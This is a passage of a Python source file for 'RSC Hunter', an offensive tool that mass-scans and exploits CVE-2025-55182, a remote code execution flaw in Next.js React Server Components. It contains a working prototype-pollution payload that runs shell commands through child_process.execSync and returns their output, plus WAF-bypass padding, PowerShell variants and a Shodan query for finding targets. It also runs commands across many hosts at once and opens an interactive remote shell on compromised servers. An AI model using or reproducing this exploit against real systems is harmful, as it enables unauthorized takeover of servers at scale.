                    if "NEXT_REDIRECT" in response.text or "digest" in response.text:
                        
                        # Parse the digest field which contains command output
                        match = re.search(r'"digest":"([^"]+)"', response.text)
                        if match:
                            digest = match.group(1)
                            # Validate digest doesn't look like error message
                            if len(digest) > 0 and not any(x in digest.lower() for x in ['error', 'rejected', 'forbidden', 'html']):
                                return digest
                            else:
                                continue
                        
                        # Sometimes it's in a different format
                        match = re.search(r'digest[^:]*:\s*([^,}\n]+)', response.text)
                        if match:
                            result = match.group(1).strip('"\'')
                            if len(result) > 0 and not any(x in result.lower() for x in ['error', 'rejected', 'forbidden']):
                                return result
                        
                except Exception as e:
                    continue
            
            return None
            
        except Exception as e:
            return None
    
    def _exploitMethod3(self, target: str, cmd: str) -> Optional[str]:
        """PRIMARY exploit (msanft's working PoC) - sends directly to base URL"""
        try:
            # Adjust command for Windows if needed
            if self.windowsMode:
                cmd = f'powershell -c "{cmd}"'
            
            # msanft's working payload format
            craftedChunk = {
                "then": "$1:__proto__:then",
                "status": "resolved_model",
                "reason": -1,
                "value": '{"then": "$B0"}',
                "_response": {
                    "_prefix": f"var res = process.mainModule.require('child_process').execSync('{cmd}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'),{{digest:`${{res}}`}});",
                    "_formData": {
                        "get": "$1:constructor:constructor",
                    },
                },
            }
            
            # Build multipart form data
            if self.wafBypass:
                param_name, junk_data = generate_junk_data(self.wafBypassSize)
                files = {
                    param_name: (None, junk_data),
                    "0": (None, json.dumps(craftedChunk)),
                    "1": (None, '"$@0"'),
                }
            else:
                files = {
                    "0": (None, json.dumps(craftedChunk)),
                    "1": (None, '"$@0"'),
                }
            
            headers = {"Next-Action": "x"}
            timeout = 20 if self.wafBypass else 10
            
            # Send directly to base URL (like msanft's working exploit)
            # Don't try multiple endpoints - this is the reliable method
            try:
                if self.debug:
                    print(f"{Colors.CYAN}[DEBUG] Sending to: {target}{Colors.RESET}")
                
                response = self.scanner.session.post(
                    target,
                    files=files,
                    headers=headers,
                    timeout=timeout
                )
                
                # Check for WAF blocks
                if is_waf_block(response):
                    if self.debug:
                        print(f"{Colors.YELLOW}[DEBUG] WAF detected{Colors.RESET}")
                    return None
                
                if self.debug:
                    print(f"{Colors.CYAN}[DEBUG] Response status: {response.status_code}{Colors.RESET}")
                    print(f"{Colors.CYAN}[DEBUG] Response preview: {response.text[:200]}{Colors.RESET}")
                
                # Extract output from digest field
                if "NEXT_REDIRECT" in response.text or "digest" in response.text:
                    match = re.search(r'"digest":"([^"]+)"', response.text)
                    if match:
                        digest = match.group(1)
                        if self.debug:
                            print(f"{Colors.CYAN}[DEBUG] Found digest: {digest}{Colors.RESET}")
                        if len(digest) > 0 and not any(x in digest.lower() for x in ['error', 'rejected', 'forbidden', 'html']):
                            return digest
                    
                    # Alternative format
                    match = re.search(r'digest[^:]*:\s*([^,}\n]+)', response.text)
                    if match:
                        result = match.group(1).strip('"\'')
                        if self.debug:
                            print(f"{Colors.CYAN}[DEBUG] Found result: {result}{Colors.RESET}")
                        if len(result) > 0:
                            return result
                    
            except Exception as e:
                if self.debug:
                    print(f"{Colors.RED}[DEBUG] Error: {str(e)}{Colors.RESET}")
                return None
            
            return None
            
        except Exception as e:
            return None

    def scanTargets(self, targets: List[str], resume: bool = False, liveShell = None, suppressSummary: bool = False) -> List[ScanResult]:
        """Scan multiple targets with concurrent processing
        
        Args:
            suppressSummary: If True, skip printing the scan summary (useful for -sh/-exec modes)
        """
        
        scanId = datetime.now().strftime("%Y%m%d_%H%M%S")
        completed = set()
        results = []
        
        # Resume from previous state if requested
        if resume:
            state = self.stateManager.loadState()
            if state:
                print(f"{Colors.CYAN}📂 Resuming scan from {state['timestamp']}{Colors.RESET}")
                completed = set(state['completed'])
                results = [ScanResult(**r) for r in state['results']]
                scanId = state['scanId']
        
        # Filter out already completed targets
        pending = [t for t in targets if t not in completed]
        total = len(targets)
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}{EMOJI_SHIELD} RSC Mass Vulnerability Scanner{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{EMOJI_CHART} Total targets: {Colors.BOLD}{total}{Colors.RESET}")
        print(f"{EMOJI_CHECK} Already scanned: {Colors.GREEN}{len(completed)}{Colors.RESET}")
        print(f"{EMOJI_PENDING} Pending: {Colors.YELLOW}{len(pending)}{Colors.RESET}")
        print(f"{EMOJI_THREAD} Workers: {Colors.BOLD}{self.maxWorkers}{Colors.RESET}")
        if self.execCommand:
            print(f"{EMOJI_LIGHTNING} Exec: {Colors.MAGENTA}{self.execCommand}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        if not pending:
            print(f"{Colors.GREEN}{EMOJI_GREEN_CHECK} All targets already scanned!{Colors.RESET}\n")
            return results
        
        # Scan with progress tracking
        startTime = time.time()
        
        with ThreadPoolExecutor(max_workers=self.maxWorkers) as executor:
            # Submit all tasks
            futureToUrl = {
                executor.submit(self.scanner.scanUrl, url): url 
                for url in pending
            }
            
            # Process completed tasks
            for future in as_completed(futureToUrl):
                if self.stopScan:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                
                url = futureToUrl[future]
                
                try:
                    result = future.result()
                    
                    # If execCommand is set and target detected as vulnerable, verify exploitability
                    if result.vulnerable and self.execCommand:
                        # executeRemoteCommand now validates RCE internally
                        result.execOutput = self.executeRemoteCommand(result.url, None, skipValidation=False)
                        
                        # If exploitation failed (WAF/protection blocking or RCE validation failed), mark as NOT vulnerable
                        if not result.execOutput or len(result.execOutput.strip()) == 0:
                            result.wafProtected = True
                            result.vulnerable = False  # Change to NOT vulnerable
                            result.details.append("⚠️ RSC detected but exploitation blocked (WAF/firewall or validation failed)")
                    
                    results.append(result)
                    completed.add(url)
                    
                    # Update live shell with new vulnerable target (only if actually exploitable)
                    if result.vulnerable and not result.wafProtected and liveShell:
                        liveShell.addVulnerableTarget(result.url)
                    
                    # Print result (skip clean targets in shell mode, but show WAF protected ones)
                    if not liveShell or result.vulnerable or result.wafProtected or result.error:
                        self._printResult(result, len(completed), total)
                    
                    # Save state periodically (every 10 scans)
                    if not self.noSave and self.stateManager and len(completed) % 10 == 0:
                        self.stateManager.saveState(targets, completed, results, scanId)
                    
                    # Handle pause
                    while self.paused and not self.stopScan:
                        time.sleep(0.5)
                    
                except Exception as e:
                    print(f"{Colors.RED}✗ {UrlParser.extractDomain(url)}: Error - {str(e)[:50]}{Colors.RESET}")
        
        # Final state save
        if not self.noSave and self.stateManager:
            self.stateManager.saveState(targets, completed, results, scanId)
        
        # Print summary (skip for -sh/-exec modes)
        if not suppressSummary:
            elapsed = time.time() - startTime
            self._printSummary(results, elapsed, scanId)
        
        return results
    
    def _printResult(self, result: ScanResult, current: int, total: int):
        """Print individual scan result"""
        domain = UrlParser.extractDomain(result.url)
        progress = f"[{current}/{total}]"
        
        if result.error:
            print(f"{Colors.YELLOW}{progress} {EMOJI_WARN} {domain}: {result.error}{Colors.RESET}")
        elif result.wafProtected:
            # RSC detected but WAF blocks - show as protected/clean
            print(f"{Colors.CYAN}{progress} [RSC DETECTED - PROTECTED] {domain}{Colors.RESET}")
            print(f"{Colors.CYAN}   ↳ 🛡️  WAF/firewall blocking exploitation{Colors.RESET}")
        elif result.vulnerable:
            print(f"{Colors.RED}{Colors.BOLD}{progress} [VULNERABLE] {domain}{Colors.RESET}")
            if result.execOutput:
                print(f"{Colors.MAGENTA}   ↳ Exec Output: {result.execOutput.splitlines()[0]}...{Colors.RESET}")
        else:
            print(f"{Colors.GREEN}{progress} ✓ {domain}{Colors.RESET}")
    
    def _printSummary(self, results: List[ScanResult], elapsed: float, scanId: str):
        """Print scan summary with statistics"""
        vulnerable = [r for r in results if r.vulnerable]
        errors = [r for r in results if r.error]
        clean = [r for r in results if not r.vulnerable and not r.error]
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}{EMOJI_CHART} SCAN SUMMARY{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        print(f"⏱  Scan time: {Colors.BOLD}{elapsed:.2f}s{Colors.RESET}")
        print(f"🆔 Scan ID: {Colors.BOLD}{scanId}{Colors.RESET}")
        print(f"📈 Scan rate: {Colors.BOLD}{len(results)/elapsed:.2f} targets/sec{Colors.RESET}\n")
        
        print(f"Total scanned: {Colors.BOLD}{len(results)}{Colors.RESET}")
        print(f"{Colors.RED}💀 Vulnerable: {Colors.BOLD}{len(vulnerable)}{Colors.RESET}")
        print(f"{Colors.GREEN}👌 Clean: {Colors.BOLD}{len(clean)}{Colors.RESET}")
        print(f"{Colors.YELLOW}❗  Errors: {Colors.BOLD}{len(errors)}{Colors.RESET}\n")
        
        if vulnerable:
            print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}{EMOJI_WARN_EMOJI}  VULNERABLE TARGETS{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}\n")
            
            # Create table
            print(f"{Colors.BOLD}{'#':<4} {'Domain/URL':<40} {'Detections':<25}{Colors.RESET}")
            print(f"{Colors.RED}{'-'*70}{Colors.RESET}")
            
            for idx, result in enumerate(vulnerable, 1):
                domain = UrlParser.extractDomain(result.url)
                detections = []
                if result.passiveDetected:
                    detections.append("Passive")
                if result.activeDetected:
                    detections.append("Active")
                if result.endpointVulnerable:
                    detections.append("Endpoint")
                
                detectionStr = ", ".join(detections)
                
                print(f"{Colors.RED}{idx:<4} {domain:<40} {detectionStr:<25}{Colors.RESET}")
                
                # Print URL if different from domain
                if domain != result.url:
                    print(f"     {Colors.YELLOW}{result.url}{Colors.RESET}")
                
                # Show WAF protection status
                if result.wafProtected:
                    print(f"     {Colors.YELLOW}⚠️  WAF Protected - exploitation blocked{Colors.RESET}")
                elif result.execOutput:
                    print(f"     {Colors.MAGENTA}Exec: {result.execOutput.replace(chr(10), ' | ')}{Colors.RESET}")
            
            print(f"\n{Colors.RED}{EMOJI_WARN}  These targets are potentially vulnerable to CVE-2025-55182{Colors.RESET}")
            print(f"{Colors.YELLOW}📝 Full results saved to: scan_state.json{Colors.RESET}")
        
        print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        # Clear state if scan completed successfully
        if not self.stopScan and not self.paused:
            # Keep the state file but mark as complete
            pass


def generateCSV(results: List[ScanResult], filename: str = None):
    """Generate CSV report containing only vulnerable targets
    
    Args:
        results: List of scan results
        filename: Output filename (default: rsc-scan_<timestamp>.csv)
        
    Note:
        Only vulnerable targets are exported. Clean, protected, and error targets are excluded.
    """
    import csv
    
    # Filter only vulnerable targets
    vulnerable_results = [r for r in results if r.vulnerable]
    
    if not vulnerable_results:
        print(f"{Colors.YELLOW}[!] No vulnerable targets to export{Colors.RESET}")
        return
    
    # Use timestamp-based filename if not specified
    if not filename:
        filename = f"rsc-scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        
        # Header
        writer.writerow(['Domain', 'URL', 'Passive', 'Active', 'Endpoint', 'Exec Output', 'Details', 'Timestamp'])
        
        # Data rows - only vulnerable targets
        for result in vulnerable_results:
            domain = UrlParser.extractDomain(result.url)
            
            writer.writerow([
                domain,
                result.url,
                'Yes' if result.passiveDetected else 'No',
                'Yes' if result.activeDetected else 'No',
                'Yes' if result.endpointVulnerable else 'No',
                result.execOutput or '',
                ' | '.join(result.details),
                result.timestamp
            ])
    
    print(f"{Colors.GREEN}{EMOJI_FILE} CSV saved: {filename} ({len(vulnerable_results)} vulnerable targets){Colors.RESET}")


def main():
    """Main entry point"""
    
    # Check if output is a TTY
    if not sys.stdout.isatty():
        Colors.disable()
    
    # Detect Unicode support for emojis
    supportsUnicode = True
    try:
        "⚠".encode(sys.stdout.encoding or 'utf-8')
    except (UnicodeEncodeError, AttributeError):
        supportsUnicode = False
    
    # Emoji/symbol fallbacks for Windows CI
    warn = "⚠" if supportsUnicode else "[!]"
    check = "✓" if supportsUnicode else "[+]"
    bullet = "•" if supportsUnicode else "*"
    chart = "📊" if supportsUnicode else "[STATS]"
    lightning = "⚡" if supportsUnicode else "[>>]"
    file_emoji = "📄" if supportsUnicode else "[FILE]"
    shield = "🛡" if supportsUnicode else "[*]"
    pause = "⏸" if supportsUnicode else "[||]"
    warn_emoji = "⚠️" if supportsUnicode else "[!]"
    tree_branch = "├─" if supportsUnicode else "|-"
    tree_end = "└─" if supportsUnicode else "+-"
    arrow = "→" if supportsUnicode else "->"
    
    # Create comprehensive help with examples
    epilog = f"""
{Colors.CYAN}{Colors.BOLD}EXAMPLES:{Colors.RESET}
  {Colors.GREEN}Basic Scanning:{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt{Colors.RESET}
    {Colors.CYAN}%(prog)s --url https://example.com{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt --threads 20{Colors.RESET}

  {Colors.GREEN}Interactive Shell Mode:{Colors.RESET}
    {Colors.CYAN}%(prog)s --url https://example.com -sh{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt -sh --threads 15{Colors.RESET}
    
  {Colors.GREEN}Command Execution:{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt -exec "whoami"{Colors.RESET}
    {Colors.CYAN}%(prog)s --url https://example.com -exec "id"{Colors.RESET}
    
  {Colors.GREEN}Resume & Reports:{Colors.RESET}
    {Colors.CYAN}%(prog)s --resume{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt -o custom-report.txt{Colors.RESET}
  
  {Colors.GREEN}Advanced Features:{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt --waf-bypass{Colors.RESET}
    {Colors.CYAN}%(prog)s --url https://example.com --windows{Colors.RESET}
    {Colors.CYAN}%(prog)s targets.txt --vercel-waf-bypass --threads 20{Colors.RESET}
    {Colors.CYAN}%(prog)s --url https://example.com --no-follow-redirects{Colors.RESET}

{Colors.CYAN}{Colors.BOLD}INPUT FILE FORMAT:{Colors.RESET}
  {Colors.YELLOW}# Comments start with #{Colors.RESET}
  example.com
  https://test.example.net
  subdomain.example.org:8080
  
  {Colors.GREEN}URLs are auto-normalized (https:// added if missing){Colors.RESET}

{Colors.CYAN}{Colors.BOLD}INTERACTIVE SHELL COMMANDS:{Colors.RESET}
  {Colors.GREEN}whoami{Colors.RESET}              Execute command on current target
  {Colors.GREEN}targets{Colors.RESET}             List all vulnerable targets
  {Colors.GREEN}switch <id>{Colors.RESET}         Switch to different target
  {Colors.GREEN}info{Colors.RESET}                Show current target information
  {Colors.GREEN}refresh{Colors.RESET}             Update vulnerable targets count
  {Colors.GREEN}exit, quit{Colors.RESET}          Exit the shell

{Colors.CYAN}{Colors.BOLD}DETECTION METHODS:{Colors.RESET}
  {Colors.MAGENTA}{bullet}{Colors.RESET} Passive: Content-Type, Flight Protocol, Shodan headers
  {Colors.MAGENTA}{bullet}{Colors.RESET} Active: RSC headers, endpoint probing
  {Colors.MAGENTA}{bullet}{Colors.RESET} Error-based: REACT2SHELL_PROBE marker detection
  {Colors.MAGENTA}{bullet}{Colors.RESET} Fingerprint: __NEXT_DATA__, x-middleware-rewrite
  {Colors.MAGENTA}{bullet}{Colors.RESET} RCE Proof: X-Action-Redirect header analysis
  {Colors.MAGENTA}{bullet}{Colors.RESET} Mitigation Filter: Vercel/Netlify protection detection

{Colors.CYAN}{Colors.BOLD}ADVANCED FEATURES:{Colors.RESET}
  {Colors.GREEN}--waf-bypass{Colors.RESET}           Prepend junk data to evade WAF inspection
  {Colors.GREEN}--waf-bypass-size KB{Colors.RESET}   Customize junk data size (default: 128KB)
  {Colors.GREEN}--windows{Colors.RESET}              Use PowerShell payloads for Windows targets
  {Colors.GREEN}--vercel-waf-bypass{Colors.RESET}    Vercel-specific WAF bypass payload
  {Colors.GREEN}--follow-redirects{Colors.RESET}     Follow same-host redirects (default: on)
  {Colors.GREEN}--no-follow-redirects{Colors.RESET}  Disable redirect following
  
{Colors.CYAN}{Colors.BOLD}OUTPUT FILES:{Colors.RESET}
  {Colors.YELLOW}scan_state.json{Colors.RESET}     Resume state & full results (JSON)
  {Colors.YELLOW}rsc-report.txt{Colors.RESET}      Human-readable vulnerability report

{Colors.CYAN}{Colors.BOLD}NOTES:{Colors.RESET}
  {Colors.YELLOW}{warn}{Colors.RESET}  Scan state saved every 10 targets for resume
  {Colors.YELLOW}{warn}{Colors.RESET}  Use Ctrl+C once to pause, twice to stop
  {Colors.YELLOW}{warn}{Colors.RESET}  Shell mode filters out clean targets
  {Colors.GREEN}{check}{Colors.RESET}  Dual exploit methods with automatic fallback

{Colors.RED}{Colors.BOLD}CVE INFORMATION:{Colors.RESET}
  {Colors.RED}CVE-2025-55182:{Colors.RESET} React Server Components RCE
  {Colors.RED}Affected:{Colors.RESET} Next.js < 15.1.4, 14.2.24, 13.5.8
  {Colors.RED}Severity:{Colors.RESET} {Colors.RED}{Colors.BOLD}Critical{Colors.RESET} (Prototype Pollution {arrow} RCE)
  {Colors.YELLOW}Shodan Query:{Colors.RESET} "X-Powered-By: Next.js" "x-middleware"

{Colors.MAGENTA}{Colors.BOLD}AUTHOR & CREDITS:{Colors.RESET}
  {Colors.CYAN}{Colors.BOLD}Suman Roy{Colors.RESET} ({Colors.GREEN}@sumanrox{Colors.RESET})
  {Colors.BLUE}{tree_branch} GitHub:{Colors.RESET}  https://github.com/sumanrox
  {Colors.BLUE}{tree_end} Website:{Colors.RESET} https://sumanroy.in
  
  {Colors.YELLOW}Research Credits:{Colors.RESET}
  {Colors.GREEN}{bullet}{Colors.RESET} Security community - Real-world attack surface analysis

{Colors.BLUE}Tool Repository: https://github.com/sumanrox/rschunter{Colors.RESET}
"""
    
    parser = argparse.ArgumentParser(
        prog='rschunter.py',
        description=f'{Colors.RED}{Colors.BOLD}RSC Hunter{Colors.RESET} - Mass Vulnerability Scanner for {Colors.RED}CVE-2025-55182{Colors.RESET}\n\n'
                    f'{Colors.CYAN}High-performance scanner targeting React Server Components in Next.js applications.{Colors.RESET}\n'
                    f'{Colors.GREEN}Features multi-layered detection, dual exploit methods, and interactive shell.{Colors.RESET}',
        epilog=epilog,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=True
    )
    
    # Input sources (mutually exclusive)
    input_group = parser.add_argument_group('Input Sources')
    input_group.add_argument(
        "input", 
        nargs="?", 
        metavar="FILE",
        help="Input file containing target URLs (one per line)"
    )
    input_group.add_argument(
        "--url", 
        metavar="URL",
        help="Single target URL or domain to scan"
    )
    input_group.add_argument(
        "--resume", 
        action="store_true",
        help="Resume from last saved state (scan_state.json)"
    )
    
    # Scanning options
    scan_group = parser.add_argument_group('Scanning Options')
    scan_group.add_argument(
        "--threads", 
        type=int, 
        default=10,
        metavar="N",
        help="Number of concurrent worker threads (default: 10, recommended: 10-20)"
    )
    scan_group.add_argument(
        "--follow-redirects",
        action="store_true",
        default=True,
        help="Follow same-host redirects (default: enabled)"
    )
    scan_group.add_argument(
        "--no-follow-redirects",
        action="store_false",
        dest="follow_redirects",
        help="Disable redirect following"
    )
    
    # Advanced options
    advanced_group = parser.add_argument_group('Advanced Options')
    advanced_group.add_argument(
        "--waf-bypass",
        action="store_true",
        help="Enable WAF bypass mode (prepend junk data to requests)"
    )
    advanced_group.add_argument(
        "--waf-bypass-size",
        type=int,
        default=128,
        metavar="KB",
        help="Size of junk data for WAF bypass in KB (default: 128)"
    )
    advanced_group.add_argument(
        "--windows",
        action="store_true",
        help="Use Windows PowerShell payloads instead of Unix shell"
    )
    advanced_group.add_argument(
        "--vercel-waf-bypass",
        action="store_true",
        help="Use Vercel-specific WAF bypass payload variant"
    )
    advanced_group.add_argument(
        "--proxy",
        metavar="URL",
        help="Proxy URL for traffic inspection (e.g., http://127.0.0.1:8080 for Burp Suite)"
    )
    
    # Exploitation options
    exploit_group = parser.add_argument_group('Exploitation Options')
    exploit_group.add_argument(
        "-sh", "--shell", 
        action="store_true",
        help="Start interactive shell on vulnerable target(s). Works with --url or file input."
    )
    exploit_group.add_argument(
        "-exec", 
        dest="execCommand",
        metavar="CMD",
        help="Execute command on all vulnerable targets. Use {} as placeholder for URL."
    )
    
    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument(
        "-o", "--output", 
        default=None,
        metavar="FILE",
        help="CSV output filename for vulnerable targets only (default: rsc-scan_<timestamp>.csv)"
    )
    output_group.add_argument(
        "--save",
        action="store_true",
        help="Save vulnerable targets to CSV file (default: no saving)"
    )
    output_group.add_argument(
        "--debug",
        action="store_true",
        help="Enable debug output (verbose logging)"
    )
    
    args = parser.parse_args()
    
    # Support HTTP_PROXY/HTTPS_PROXY environment variables if --proxy not specified
    if not args.proxy:
        args.proxy = os.environ.get('HTTP_PROXY') or os.environ.get('HTTPS_PROXY')
    
    if not args.input and not args.url and not args.resume:
        parser.print_help()
        sys.exit(1)
    
    # Auto-increase timeout for WAF bypass mode
    timeout = 20 if args.waf_bypass else 10
    
    # Print configuration if advanced features are used
    if args.waf_bypass or args.windows or args.vercel_waf_bypass or not args.follow_redirects or args.proxy:
        print(f"\n{Colors.CYAN}{Colors.BOLD}Advanced Configuration:{Colors.RESET}")
        if args.waf_bypass:
            print(f"  {Colors.GREEN}{check}{Colors.RESET} WAF Bypass: Enabled ({args.waf_bypass_size}KB junk data)")
            print(f"  {Colors.GREEN}{check}{Colors.RESET} Timeout: {timeout}s (auto-increased)")
        if args.vercel_waf_bypass:
            print(f"  {Colors.GREEN}{check}{Colors.RESET} Vercel WAF Bypass: Enabled")
        if args.windows:
            print(f"  {Colors.GREEN}{check}{Colors.RESET} Windows Mode: PowerShell payloads")
        if not args.follow_redirects:
            print(f"  {Colors.YELLOW}{warn}{Colors.RESET} Redirect Following: Disabled")
        if args.proxy:
            print(f"  {Colors.GREEN}{check}{Colors.RESET} Proxy: {args.proxy} (SSL verification disabled)")
        print()
    
    try:
        scanner = MassScanner(
            maxWorkers=args.threads,
            execCommand=args.execCommand,
            wafBypass=args.waf_bypass,
            wafBypassSize=args.waf_bypass_size,
            windowsMode=args.windows,
            vercelWafBypass=args.vercel_waf_bypass,
            followRedirects=args.follow_redirects,
            noSave=not args.save,  # Invert: save only if --save flag is provided
            debug=args.debug,
            proxy=args.proxy
        )
        
        if args.resume:
            # Resume from saved state
            state = scanner.stateManager.loadState()
            if not state:
                print(f"{Colors.RED}No saved state found. Start a new scan instead.{Colors.RESET}")
                sys.exit(1)
            
            targets = state['targets']
            # Suppress summary for resume if using -sh/-exec
            results = scanner.scanTargets(targets, resume=True, suppressSummary=(args.shell or args.execCommand is not None))
        elif args.url:
            # Single URL scan
            normalized = UrlParser.normalizeUrl(args.url)
            if not normalized:
                print(f"{Colors.RED}Invalid URL: {args.url}{Colors.RESET}")
                sys.exit(1)
            
            # Validate -sh flag compatibility
            if args.shell and args.execCommand:
                print(f"{Colors.YELLOW}[!] Warning: -sh and -exec flags both specified. Using interactive shell mode.{Colors.RESET}")
            
            targets = [normalized]
            results = scanner.scanTargets(targets, suppressSummary=(args.execCommand is not None))
            
            # Start interactive shell if requested and target is vulnerable
            if args.shell and results:
                vulnerableResults = [r for r in results if r.vulnerable]
                if vulnerableResults:
                    print(f"\n{Colors.GREEN}[+] Target is vulnerable! Starting interactive shell...{Colors.RESET}")
                    shell = InteractiveShell(normalized, scanner)
                    try:
                        shell.cmdloop()
                    except KeyboardInterrupt:
                        print(f"\n{Colors.YELLOW}Shell interrupted.{Colors.RESET}")
                else:
                    print(f"\n{Colors.YELLOW}[!] Target is not vulnerable. Cannot start shell.{Colors.RESET}")
        else:
            # File-based mass scan
            targets = scanner.loadTargets(args.input)
            
            if not targets:
                print(f"{Colors.RED}No valid targets found in {args.input}{Colors.RESET}")
                sys.exit(1)
            
            # If shell mode requested, start interactive shell in parallel with scanning
            if args.shell:
                print(f"{Colors.CYAN}[*] Starting mass scan with interactive shell mode{Colors.RESET}")
                print(f"{Colors.CYAN}[*] Shell will activate as vulnerable targets are discovered{Colors.RESET}")
                print(f"{Colors.YELLOW}[*] Clean targets will be omitted from output\n{Colors.RESET}")
                
                # Create shell with empty vulnerable list (will be populated during scan)
                shell = InteractiveShell("scanning...", scanner, vulnerableTargets=[], massMode=True)
                
                # Start scanning in background thread
                scanComplete = threading.Event()
                scanResults = []
                
                def runScan():
                    nonlocal scanResults
                    scanResults = scanner.scanTargets(targets, liveShell=shell, suppressSummary=True)
                    scanComplete.set()
                
                scanThread = threading.Thread(target=runScan, daemon=True)
                scanThread.start()
                
                # Wait a moment for first results
                time.sleep(2)
                
                # Check if any vulnerable targets found
                if shell.vulnerableTargets:
                    shell.target = shell.vulnerableTargets[0]
                    shell.domain = UrlParser.extractDomain(shell.target)
                    shell._updatePrompt()
                    print(f"\n{Colors.GREEN}[+] Vulnerable target(s) found! Starting interactive shell...{Colors.RESET}")
                    print(f"{Colors.YELLOW}[*] Scanning continues in background. Use 'targets' to see updates.{Colors.RESET}\n")
                    
                    try:
                        shell.cmdloop()
                    except KeyboardInterrupt:
                        print(f"\n{Colors.YELLOW}Shell interrupted.{Colors.RESET}")
                        shell.should_exit.set()
                    
                    # If user exited shell, don't wait for scan
                    if not shell.should_exit.is_set():
                        scanComplete.wait(timeout=30)
                    else:
                        print(f"{Colors.YELLOW}[*] Exiting (scan continues in background)...{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[*] Waiting for vulnerable targets...{Colors.RESET}")
                    
                    # Wait for scan or exit signal
                    while not scanComplete.is_set() and not shell.should_exit.is_set():
                        scanComplete.wait(timeout=1)
                    
                    if shell.should_exit.is_set():
                        print(f"{Colors.YELLOW}[*] Exiting...{Colors.RESET}")
                    elif shell.vulnerableTargets:
                        shell.target = shell.vulnerableTargets[0]
                        shell.domain = UrlParser.extractDomain(shell.target)
                        shell._updatePrompt()
                        print(f"\n{Colors.GREEN}[+] Found {len(shell.vulnerableTargets)} vulnerable target(s)!{Colors.RESET}")
                        try:
                            shell.cmdloop()
                        except KeyboardInterrupt:
                            print(f"\n{Colors.YELLOW}Shell interrupted.{Colors.RESET}")
                    else:
                        print(f"{Colors.YELLOW}[!] No vulnerable targets found.{Colors.RESET}")
                
                results = scanResults
            else:
                # Suppress summary if using -exec (cleaner output for mass exploitation)
                results = scanner.scanTargets(targets, suppressSummary=(args.execCommand is not None))
        
        # Generate CSV report if --save is specified
        if args.save:
            generateCSV(results, args.output)
        
        # Exit with code 1 if vulnerabilities found
        vulnerableCount = sum(1 for r in results if r.vulnerable)
        sys.exit(1 if vulnerableCount > 0 else 0)
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Scan interrupted. Run with --resume to continue.{Colors.RESET}\n")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Colors.RED}Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"{Colors.RED}Unexpected error: {e}{Colors.RESET}")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Interrupted by user.{Colors.RESET}")
        sys.exit(0)